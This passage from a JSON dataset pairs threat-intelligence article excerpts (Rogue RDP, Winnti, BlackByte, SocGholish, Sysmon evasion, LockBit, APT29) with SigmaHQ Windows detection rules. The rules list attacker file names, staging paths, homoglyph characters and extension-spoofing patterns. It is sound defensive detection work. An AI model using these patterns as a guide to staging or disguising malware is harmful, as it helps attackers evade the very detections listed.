    "markdown": "# Rogue RDP – Revisiting Initial Access Methods **Date:** 28 Feb 2022 ## The Hunt for Initial Access With the default disablement of VBA macros originating from the internet, Microsoft may be pitching a curveball to threat actors and red teams that will inevitably make initial access a bit more difficult to achieve. Over the last year, I have invested some research time in pursuing the use of the Remote Desktop Protocol as an alternative initial access vector, which this post will cover. In efforts to regain traction, I want to introduce a new technique I dubbed as **Rogue RDP**.",
    "sigma_rule": {
      "title": ".RDP File Created By Uncommon Application",
      "id": "fccfb43e-09a7-4bd2-8b37-a5a7df33386d",
      "related": [
        {
          "id": "f748c45a-f8d3-4e6f-b617-fe176f695b8f",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects creation of a file with an \".rdp\" extension by an application that doesn't commonly create such files.\n",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-18",
      "modified": "2024-11-01",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": ".rdp",
          "Image|endswith": [
            "\\brave.exe",
            "\\CCleaner Browser\\Application\\CCleanerBrowser.exe",
            "\\chromium.exe",
            "\\firefox.exe",
            "\\Google\\Chrome\\Application\\chrome.exe",
            "\\iexplore.exe",
            "\\microsoftedge.exe",
            "\\msedge.exe",
            "\\Opera.exe",
            "\\Vivaldi.exe",
            "\\Whale.exe",
            "\\olk.exe",
            "\\Outlook.exe",
            "\\RuntimeBroker.exe",
            "\\Thunderbird.exe",
            "\\Discord.exe",
            "\\Keybase.exe",
            "\\msteams.exe",
            "\\Slack.exe",
            "\\teams.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_rdp_file_susp_creation.yml"
  },
  "880": {
    "url": "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/",
    "markdown": "# Detecting Rogue RDP You won't believe what Sysmon missed with this new initial access technique! **March 27, 2022** ## Table of Contents - Introduction - Rogue RDP Technique - Signals - Detection Opportunities - Microsoft Defender for Endpoint - Splunk/Sysmon - Sysmon Visibility Gaps - Splunk Rules - Results - Summary --- ## Introduction Microsoft recently announced the disablement of VBA macros carrying the mark of the web, impacting the ease-of-use of this widespread initial access technique. BlackHillsInfosec wrote a blog post on a different technique that could help fill the void titled “Rogue RDP”. This post examines signals",
    "sigma_rule": {
      "title": ".RDP File Created By Uncommon Application",
      "id": "fccfb43e-09a7-4bd2-8b37-a5a7df33386d",
      "related": [
        {
          "id": "f748c45a-f8d3-4e6f-b617-fe176f695b8f",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects creation of a file with an \".rdp\" extension by an application that doesn't commonly create such files.\n",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-18",
      "modified": "2024-11-01",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": ".rdp",
          "Image|endswith": [
            "\\brave.exe",
            "\\CCleaner Browser\\Application\\CCleanerBrowser.exe",
            "\\chromium.exe",
            "\\firefox.exe",
            "\\Google\\Chrome\\Application\\chrome.exe",
            "\\iexplore.exe",
            "\\microsoftedge.exe",
            "\\msedge.exe",
            "\\Opera.exe",
            "\\Vivaldi.exe",
            "\\Whale.exe",
            "\\olk.exe",
            "\\Outlook.exe",
            "\\RuntimeBroker.exe",
            "\\Thunderbird.exe",
            "\\Discord.exe",
            "\\Keybase.exe",
            "\\msteams.exe",
            "\\Slack.exe",
            "\\teams.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_rdp_file_susp_creation.yml"
  },
  "881": {
    "url": "https://web.archive.org/web/20240222070028/https://redmimicry.com/posts/redmimicry-winnti/#dropper",
    "markdown": "# RedMimicry Prototype - Winnti Emulation ## The RedMimicry Platform Prototype *This post describes an early RedMimicry prototype and does not reflect the current state of the product.* The RedMimicry platform prototype is built in a modular way in order to provide a good framework for the implementation of emulation profiles. Emulation profiles can be divided into the following components: - payload delivery and staging - command & control traffic encoding - automated breach emulation script This RedMimicry release aims to emulate the behavior of the Winnti malware from around 2015. Naturally, not all behavior is exactly replicated, but the",
    "sigma_rule": {
      "title": "Potential Winnti Dropper Activity",
      "id": "130c9e58-28ac-4f83-8574-0a4cc913b97e",
      "status": "test",
      "description": "Detects files dropped by Winnti as described in RedMimicry Winnti playbook",
      "references": [
        "https://web.archive.org/web/20240222070028/https://redmimicry.com/posts/redmimicry-winnti/#dropper"
      ],
      "author": "Alexander Rausch",
      "date": "2020-06-24",
      "modified": "2023-01-05",
      "tags": [
        "attack.defense-evasion",
        "attack.t1027"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            "\\gthread-3.6.dll",
            "\\sigcmm-2.4.dll",
            "\\Windows\\Temp\\tmp.bat"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_redmimicry_winnti_filedrop.yml"
  },
  "882": {
    "url": "https://redcanary.com/blog/intelligence-insights-november-2021/",
    "markdown": "## Intelligence Insights: November 2021 Compromised NPM package distributes cryptominer, TR delivers SquirrelWaffle, and Gamarue rises up the threat ranks. **Originally published** November 18, 2021. Last modified April 30, 2024. --- Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community. ### Highlights In October 2021, we observed the same threats we’ve grown accustomed to seeing each",
    "sigma_rule": {
      "title": "Created Files by Microsoft Sync Center",
      "id": "409f8a98-4496-4aaa-818a-c931c0a8b832",
      "status": "test",
      "description": "This rule detects suspicious files created by Microsoft Sync Center (mobsync)",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-november-2021/"
      ],
      "author": "elhoim",
      "date": "2022-04-28",
      "modified": "2022-06-02",
      "tags": [
        "attack.t1055",
        "attack.t1218",
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection_mobsync": {
          "Image|endswith": "\\mobsync.exe"
        },
        "filter_created_file": {
          "TargetFilename|endswith": [
            ".dll",
            ".exe"
          ]
        },
        "condition": "selection_mobsync and filter_created_file"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_creation_by_mobsync.yml"
  },
  "883": {
    "url": "https://redcanary.com/blog/intelligence-insights-november-2021/",
    "markdown": "## Intelligence Insights: November 2021 Compromised NPM package distributes cryptominer, TR delivers SquirrelWaffle, and Gamarue rises up the threat ranks. **Originally published** November 18, 2021. Last modified April 30, 2024. --- Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community. ### Highlights In October 2021, we observed the same threats we’ve grown accustomed to seeing each",
    "sigma_rule": {
      "title": "Suspicious Files in Default GPO Folder",
      "id": "5f87308a-0a5b-4623-ae15-d8fa1809bc60",
      "status": "test",
      "description": "Detects the creation of copy of suspicious files (EXE/DLL) to the default GPO storage folder",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-november-2021/"
      ],
      "author": "elhoim",
      "date": "2022-04-28",
      "tags": [
        "attack.t1036.005",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\",
          "TargetFilename|endswith": [
            ".dll",
            ".exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_default_gpo_dir_write.yml"
  },
  "884": {
    "url": "https://redcanary.com/blog/blackbyte-ransomware/",
    "markdown": "## ProxyShell exploitation leads to BlackByte ransomware The BlackByte ransomware operators leverage ProxyShell Microsoft Exchange vulnerabilities for initial access along with Cobalt Strike for lateral movement. Here’s what to look out for. **Originally published:** November 30, 2021 **Last modified:** April 30, 2024 --- As law enforcement arrests continue to put a dent in the plague of ransomware, new variants continue to pop up week after week. BlackByte ransomware was first publicly identified in a July 2021 BleepingComputer forum post from a user seeking help decrypting their encrypted files. Since then, there’s been a slow trickle of information regarding this new",
    "sigma_rule": {
      "title": "Suspicious MSExchangeMailboxReplication ASPX Write",
      "id": "7280c9f3-a5af-45d0-916a-bc01cb4151c9",
      "status": "test",
      "description": "Detects suspicious activity in which the MSExchangeMailboxReplication process writes .asp and .apsx files to disk, which could be a sign of ProxyShell exploitation",
      "references": [
        "https://redcanary.com/blog/blackbyte-ransomware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-25",
      "tags": [
        "attack.initial-access",
        "attack.t1190",
        "attack.persistence",
        "attack.t1505.003"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\MSExchangeMailboxReplication.exe",
          "TargetFilename|endswith": [
            ".aspx",
            ".asp"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_exchange_aspx_write.yml"
  },
  "885": {
    "url": "https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Executable File Creation",
      "id": "74babdd6-a758-4549-9632-26535279e654",
      "status": "test",
      "description": "Detect creation of suspicious executable file names.\nSome strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths.\n",
      "references": [
        "https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae",
        "https://any.run/report/66d8b1b2b9b1836d51014e4cf4ef366c0782d1099e2841a31d2e7fd50a126639/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/"
      ],
      "author": "frack113",
      "date": "2022-09-05",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ":\\$Recycle.Bin.exe",
            ":\\Documents and Settings.exe",
            ":\\MSOCache.exe",
            ":\\PerfLogs.exe",
            ":\\Recovery.exe",
            ".bat.exe",
            ".sys.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_executable_creation.yml"
  },
  "886": {
    "url": "https://any.run/report/66d8b1b2b9b1836d51014e4cf4ef366c0782d1099e2841a31d2e7fd50a126639/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Executable File Creation",
      "id": "74babdd6-a758-4549-9632-26535279e654",
      "status": "test",
      "description": "Detect creation of suspicious executable file names.\nSome strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths.\n",
      "references": [
        "https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae",
        "https://any.run/report/66d8b1b2b9b1836d51014e4cf4ef366c0782d1099e2841a31d2e7fd50a126639/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/"
      ],
      "author": "frack113",
      "date": "2022-09-05",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ":\\$Recycle.Bin.exe",
            ":\\Documents and Settings.exe",
            ":\\MSOCache.exe",
            ":\\PerfLogs.exe",
            ":\\Recovery.exe",
            ".bat.exe",
            ".sys.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_executable_creation.yml"
  },
  "887": {
    "url": "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
    "markdown": "# SocGholish Our number one threat of 2024, SocGholish leverages drive-by-downloads masquerading as software updates to trick visitors of compromised websites into executing malware. **Overall Rank:** 5 **Customers Affected:** 4.9% --- ## Analysis SocGholish is a malware family that leverages drive-by-downloads masquerading as software updates for initial access. Active since at least April 2018, SocGholish has been linked to the suspected Russian cybercrime group **Evil Corp**. As in past years, Red Canary observed SocGholish impacting a wide variety of industry verticals in 2024. Continuing trends observed in **2022** and 2023, SocGholish activity spiked in March, however 2024 also saw a",
    "sigma_rule": {
      "title": "Potential Homoglyph Attack Using Lookalike Characters in Filename",
      "id": "4f1707b1-b50b-45b4-b5a2-3978b5a5d0d6",
      "status": "test",
      "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
      "references": [
        "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
        "http://www.irongeek.com/homoglyph-attack-generator.php"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-05-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_upper": {
          "TargetFilename|contains": [
            "А",
            "В",
            "Е",
            "К",
            "М",
            "Н",
            "О",
            "Р",
            "С",
            "Т",
            "Х",
            "Ѕ",
            "І",
            "Ј",
            "Ү",
            "Ӏ",
            "Ԍ",
            "Ԛ",
            "Ԝ",
            "Α",
            "Β",
            "Ε",
            "Ζ",
            "Η",
            "Ι",
            "Κ",
            "Μ",
            "Ν",
            "Ο",
            "Ρ",
            "Τ",
            "Υ",
            "Χ"
          ]
        },
        "selection_lower": {
          "TargetFilename|contains": [
            "а",
            "е",
            "о",
            "р",
            "с",
            "х",
            "ѕ",
            "і",
            "ӏ",
            "ј",
            "һ",
            "ԁ",
            "ԛ",
            "ԝ",
            "ο"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "File names with legitimate Cyrillic text. Will likely require tuning (or not be usable) in countries where these alphabets are in use."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_homoglyph_filename.yml"
  },
  "888": {
    "url": "http://www.irongeek.com/homoglyph-attack-generator.php",
    "markdown": "# Homoglyph Attack Generator This app is meant to make it easier to generate homographs based on Homoglyphs than having to search for look-a-like character in Unicode, then coping and pasting. Please use only for legitimate pen-test purposes and user awareness training. I also recommend webapp developers use it to test out possible user impersonation attacks in their code. This is still a work in progress, so please send me suggestions (especially for new Homoglyphs to add). While this tool was designed with making IDNA/Punycode names for putting into DNS to display foreign characters in a browsers URL bar, it",
    "sigma_rule": {
      "title": "Potential Homoglyph Attack Using Lookalike Characters in Filename",
      "id": "4f1707b1-b50b-45b4-b5a2-3978b5a5d0d6",
      "status": "test",
      "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
      "references": [
        "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
        "http://www.irongeek.com/homoglyph-attack-generator.php"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-05-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_upper": {
          "TargetFilename|contains": [
            "А",
            "В",
            "Е",
            "К",
            "М",
            "Н",
            "О",
            "Р",
            "С",
            "Т",
            "Х",
            "Ѕ",
            "І",
            "Ј",
            "Ү",
            "Ӏ",
            "Ԍ",
            "Ԛ",
            "Ԝ",
            "Α",
            "Β",
            "Ε",
            "Ζ",
            "Η",
            "Ι",
            "Κ",
            "Μ",
            "Ν",
            "Ο",
            "Ρ",
            "Τ",
            "Υ",
            "Χ"
          ]
        },
        "selection_lower": {
          "TargetFilename|contains": [
            "а",
            "е",
            "о",
            "р",
            "с",
            "х",
            "ѕ",
            "і",
            "ӏ",
            "ј",
            "һ",
            "ԁ",
            "ԛ",
            "ԝ",
            "ο"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "File names with legitimate Cyrillic text. Will likely require tuning (or not be usable) in countries where these alphabets are in use."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_homoglyph_filename.yml"
  },
  "889": {
    "url": "https://web.archive.org/web/20230331181619/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/",
    "markdown": "# Universally Evading Sysmon and ETW **07 Apr 2020** The source code and latest release are both available. Sysmon and windows event log are both extremely powerful tools in a defender's arsenal. Their very flexible configurations give them a great insight into the activity on endpoints, making the process of detecting attackers a lot easier. It's for this reason that I'm going to lead you through my journey in defeating them ;) There's been some great research into this by xpn and matterpreter. Their solutions are both good but don't quite reach my needs of a fully universal bypass. Metterpreter's",
    "sigma_rule": {
      "title": "Suspicious PROCEXP152.sys File Created In TMP",
      "id": "3da70954-0f2c-4103-adff-b7440368f50e",
      "status": "test",
      "description": "Detects the creation of the PROCEXP152.sys file in the application-data local temporary folder.\nThis driver is used by Sysinternals Process Explorer but also by KDU (https://github.com/hfiref0x/KDU) or Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU.\n",
      "references": [
        "https://web.archive.org/web/20230331181619/https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/"
      ],
      "author": "xknow (@xknow_infosec), xorxes (@xor_xes)",
      "date": "2019-04-08",
      "modified": "2022-11-22",
      "tags": [
        "attack.t1562.001",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": "\\AppData\\Local\\Temp\\",
          "TargetFilename|endswith": "PROCEXP152.sys"
        },
        "filter": {
          "Image|contains": [
            "\\procexp64.exe",
            "\\procexp.exe",
            "\\procmon64.exe",
            "\\procmon.exe"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Other legimate tools using this driver and filename (like Sysinternals). Note - Clever attackers may easily bypass this detection by just renaming the driver filename. Therefore just Medium-level and don't rely on it."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_procexplorer_driver_created_in_tmp_folder.yml"
  },
  "890": {
    "url": "https://intel.thedfirreport.com/events/view/30032",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Binaries and Scripts in Public Folder",
      "id": "b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e",
      "status": "experimental",
      "description": "Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.",
      "references": [
        "https://intel.thedfirreport.com/events/view/30032",
        "https://intel.thedfirreport.com/eventReports/view/70",
        "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/"
      ],
      "author": "The DFIR Report",
      "date": "2025-01-23",
      "tags": [
        "attack.execution",
        "attack.t1204"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": ":\\Users\\Public\\",
          "TargetFilename|endswith": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".js",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrators deploying legitimate binaries to public folders."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_public_folder_extension.yml"
  },
  "891": {
    "url": "https://intel.thedfirreport.com/eventReports/view/70",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Binaries and Scripts in Public Folder",
      "id": "b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e",
      "status": "experimental",
      "description": "Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.",
      "references": [
        "https://intel.thedfirreport.com/events/view/30032",
        "https://intel.thedfirreport.com/eventReports/view/70",
        "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/"
      ],
      "author": "The DFIR Report",
      "date": "2025-01-23",
      "tags": [
        "attack.execution",
        "attack.t1204"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": ":\\Users\\Public\\",
          "TargetFilename|endswith": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".js",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrators deploying legitimate binaries to public folders."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_public_folder_extension.yml"
  },
  "892": {
    "url": "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/",
    "markdown": "# Cobalt Strike and a Pair of SOCKS Lead to LockBit Ransomware **Categories:** cobaltstrike, lockbit, ransomware **Date:** January 27, 2025 ## Key Takeaways - This intrusion began with the download and execution of a Cobalt Strike beacon that impersonated a Windows Media Configuration Utility. - The threat actor used Rclone to exfiltrate data from the environment. First, they attempted FTP transfers, which failed, before moving to using MEGA.io. A day later, they ran a second successful FTP exfiltration. - The threat actor created several persistent backdoors in the environment, using scheduled tasks, GhostSOCKS and SystemBC proxies, and Cobalt Strike command",
    "sigma_rule": {
      "title": "Suspicious Binaries and Scripts in Public Folder",
      "id": "b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e",
      "status": "experimental",
      "description": "Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.",
      "references": [
        "https://intel.thedfirreport.com/events/view/30032",
        "https://intel.thedfirreport.com/eventReports/view/70",
        "https://thedfirreport.com/2025/01/27/cobalt-strike-and-a-pair-of-socks-lead-to-lockbit-ransomware/"
      ],
      "author": "The DFIR Report",
      "date": "2025-01-23",
      "tags": [
        "attack.execution",
        "attack.t1204"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetFilename|contains": ":\\Users\\Public\\",
          "TargetFilename|endswith": [
            ".bat",
            ".dll",
            ".exe",
            ".hta",
            ".js",
            ".ps1",
            ".vbe",
            ".vbs"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Administrators deploying legitimate binaries to public folders."
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_public_folder_extension.yml"
  },
  "893": {
    "url": "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
    "markdown": "# The Spies Who Loved You: Infected USB Drives to Steal Secrets **Posted on:** July 11, 2023 **Tags:** Threat Intelligence --- ## Introduction In the first half of 2023, Mandiant has observed a threefold increase in the number of attacks using infected USB drives to steal secrets. Mandiant tracked all of the cases and found that the majority of the incidents could be attributed to several active USB-based operation campaigns affecting both the public and private sectors globally. Previously, we covered one of the campaigns that leverages USB flash drives as an initial infection vector and concentrates on the Philippines.",
    "sigma_rule": {
      "title": "Suspicious File Creation Activity From Fake Recycle.Bin Folder",
      "id": "cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca",
      "related": [
        {
          "id": "5ce0f04e-3efc-42af-839d-5b3a543b76c0",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects file write event from/to a fake recycle bin folder that is often used as a staging directory for malware",
      "references": [
        "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
        "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-12",
      "modified": "2023-12-11",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|contains": [
              "RECYCLERS.BIN\\",
              "RECYCLER.BIN\\"
            ]
          },
          {
            "TargetFilename|contains": [
              "RECYCLERS.BIN\\",
              "RECYCLER.BIN\\"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_recycle_bin_fake_exec.yml"
  },
  "894": {
    "url": "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/",
    "markdown": "# Diplomats Beware: Cloaked Ursa Phishing With a Twist ## Executive Summary Russia’s Foreign Intelligence Service hackers, which we call Cloaked Ursa (aka APT29, UAC-0004, Midnight Blizzard/Nobelium, Cozy Bear) are well known for targeting diplomatic missions globally. Their initial access attempts over the past two years have predominantly used phishing lures with a theme of diplomatic operations such as the following: - *Notes verbale* (semiformal government-to-government diplomatic communications) - Embassies’ operating status updates - Schedules for diplomats - Invitations to embassy events These types of lures are generally sent to individuals who handle this type of embassy correspondence as part",
    "sigma_rule": {
      "title": "Suspicious File Creation Activity From Fake Recycle.Bin Folder",
      "id": "cd8b36ac-8e4a-4c2f-a402-a29b8fbd5bca",
      "related": [
        {
          "id": "5ce0f04e-3efc-42af-839d-5b3a543b76c0",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects file write event from/to a fake recycle bin folder that is often used as a staging directory for malware",
      "references": [
        "https://www.mandiant.com/resources/blog/infected-usb-steal-secrets",
        "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-07-12",
      "modified": "2023-12-11",
      "tags": [
        "attack.persistence",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|contains": [
              "RECYCLERS.BIN\\",
              "RECYCLER.BIN\\"
            ]
          },
          {
            "TargetFilename|contains": [
              "RECYCLERS.BIN\\",
              "RECYCLER.BIN\\"
            ]
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_recycle_bin_fake_exec.yml"
  },
  "895": {
    "url": "https://redcanary.com/blog/right-to-left-override/",
    "markdown": "# “semaG dna nuF” with Right-to-Left Override Unicode Characters Originally published September 13, 2017. Last modified April 30, 2024. --- *Our Security Operations team loves to share insights on TTPs when we see them in the wild. Today we’re focusing on an oldie but a goodie: right-to-left override attacks.* ## First, a Refresher on Right-to-Left (RLO) Overrides. Unicode contains several characters designed to allow right to left (RTL) characters to be inserted inside text that is normally left to right. One of these is the “RIGHT-TO-LEFT OVERRIDE” character, U+202E. For example, we can write a normal (left to right) sentence",
    "sigma_rule": {
      "title": "Potential File Extension Spoofing Using Right-to-Left Override",
      "id": "979baf41-ca44-4540-9d0c-4fcef3b5a3a4",
      "related": [
        {
          "id": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious filenames that contain a right-to-left override character and a potentially spoofed file extensions.\n",
      "references": [
        "https://redcanary.com/blog/right-to-left-override/",
        "https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method"
      ],
      "author": "Jonathan Peters (Nextron Systems), Florian Roth (Nextron Systems)",
      "date": "2024-11-17",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1036.002"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_rtlo_unicode": {
          "TargetFilename|contains": "\\u202e"
        },
        "selection_extensions": {
          "TargetFilename|contains": [
            "fpd..",
            "nls..",
            "vsc..",
            "xcod.",
            "xslx."
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Filenames that contains scriptures such as arabic or hebrew might make use of this character"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_right_to_left_override_extension_spoofing.yml"
  },
  "896": {
